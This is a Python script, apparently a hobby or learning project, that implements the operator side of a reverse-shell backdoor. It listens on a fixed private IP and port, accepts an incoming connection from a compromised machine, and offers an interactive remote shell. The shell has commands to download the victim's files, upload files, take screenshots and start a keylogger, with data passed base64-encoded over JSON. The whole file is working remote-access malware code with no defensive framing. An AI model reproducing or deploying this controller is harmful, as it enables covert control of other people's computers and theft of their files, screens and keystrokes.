#!/usr/bin/python
# Written By: Sahar Hathiramani
# Date: 01/21/2021-01/24/2021

import socket
from termcolor import colored
import json
import os
import base64

count = 1

def reliable_send(data):
    jsonData = json.dumps(data)
    target.send(jsonData.encode())

def reliable_recv():
    data = b''
    while True:
        try:
            data = data + target.recv(1024)
            return json.loads(data)
        except ValueError:
            continue

def shell():
    global count
    while True:
        command = input("Shell#~%s: " % str(ip))
        reliable_send(command)
        if command == 'exit':
            break

        elif command[:2] == "cd" and len(command) > 1:
            continue

        elif command[:8] == "download":
            with open(command[9:], "wb") as download:
                fileData = reliable_recv()
                download.write(base64.b64decode(fileData))

        elif command[:6] == "upload": #Work in Progress
            with open(command[7:], "rb") as upload:
                try:
                    reliable_send(base64.b64encode(upload.read()))
                except:
                    failed = '[-] Failed to Upload'
                    print(colored(failed, "red"))
                    reliable_send(base64.b64encode(failed))

        elif command[:10] == "screenshot": #Work in Progress
            with open("screenshot%d" % count, "wb") as sc:
                image = reliable_recv()
                imageDecode = base64.b64decode(image)
                if imageDecode[:3] == "[-]":
                    print(image)
                else:
                    sc.write(image)
                    count += 1

        elif command[:12] == "keylog start":
            continue

        else:
            result = reliable_recv()
            print(result)

def server():
    global sock
    global ip
    global target

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("192.168.7.125", 54321))
    sock.listen(5)
    print(colored("[!] Listening For Incoming Connections", "yellow"))
    target, ip = sock.accept()
    print(colored("[+] Connection Established From : %s" % str(ip), "green"))

server()
shell()
sock.close()
